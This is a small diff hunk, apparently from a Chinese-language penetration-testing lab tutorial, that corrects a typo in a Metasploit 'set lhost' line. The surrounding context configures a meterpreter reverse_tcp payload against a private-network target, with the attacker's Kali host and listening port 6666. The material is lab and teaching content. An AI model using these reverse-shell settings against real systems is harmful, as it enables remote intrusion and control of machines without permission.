@@ -59,7 +59,7 @@ set rhosts 192.168.205.200
 # 攻击载荷
 set payload windows /x64/meterpreter/reverse_tcp
 # 攻击机IP（kali主机）
-set` `lhost 192.168.205.173
+set lhost 192.168.205.173
 # 攻击机监听端口
 set lport 6666 
 # 查看设置的参数
